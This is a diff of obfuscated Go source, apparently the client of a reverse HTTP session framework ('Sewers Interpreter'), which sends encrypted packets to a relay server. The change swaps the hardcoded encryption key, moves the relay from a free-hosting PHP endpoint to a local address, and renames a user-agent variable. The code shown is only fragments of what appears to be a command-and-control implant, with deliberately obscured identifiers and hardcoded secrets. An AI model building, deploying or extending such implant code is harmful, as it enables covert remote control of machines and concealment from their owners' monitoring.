@@ -15,14 +15,14 @@ import(
 
 const(
 	obf_const_session_id = "sess"
-	obf_const_post_tag = "P"
-	obf_const_get_tag = "G"
+	obf_const_post_tag = "ip"
+	obf_const_get_tag = "ig"
 )
 
 var(
-	obf_var_encryption_key = []byte("MZpirFa4XEQsTNmaBBaFAmXuUCe2Qan0")
-	obf_var_relay_address = "https://chatdialtest.000webhostapp.com/relay.php"
-	obf_var_useragent = "Sewers Interpreter (Linux) Reverse HTTP Test Session"
+	obf_var_encryption_key = []byte("taish6ooP6iexo6oi8YuKaph1Shai2vi")
+	obf_var_relay_address = "http://0.0.0.0:81/chat-dial.php"
+	obf_var_user_agent = "Sewers Interpreter (Linux) Reverse HTTP Test Session"
 )
 
 func obf_func_encrypt(obf_var_payload []byte) []byte {
@@ -63,7 +63,7 @@ func obf_func_send_request(obf_var_request_type, obf_const_session_id, obf_var_r
 		obf_var_packet := strings.Join(obf_var_a, "\n")
 		obf_var_packet_buffer := strings.NewReader(obf_var_packet)
 		obf_var_req, _ := http.NewRequest( "POST", obf_var_relay_address, obf_var_packet_buffer )
-		obf_var_req.Header.Set("User-Agent", obf_var_useragent)
+		obf_var_req.Header.Set("User-Agent", obf_var_user_agent)
 		obf_var_client := &http.Client{}
 		obf_var_res, _ := obf_var_client.Do(obf_var_req)
 		defer obf_var_res.Body.Close()
@@ -73,7 +73,7 @@ func obf_func_send_request(obf_var_request_type, obf_const_session_id, obf_var_r
 		obf_var_a := []string{obf_var_request_type, obf_const_session_id, obf_var_request_body}
 		obf_var_packet := strings.Join(obf_var_a, "\n")
 		obf_var_req, _ := http.NewRequest( "POST", obf_var_relay_address, strings.NewReader(obf_var_packet) )
-		obf_var_req.Header.Set("User-Agent", obf_var_useragent)
+		obf_var_req.Header.Set("User-Agent", obf_var_user_agent)
 		obf_var_client := &http.Client{}
 		obf_var_res, _ := obf_var_client.Do(obf_var_req)
 		defer obf_var_res.Body.Close()
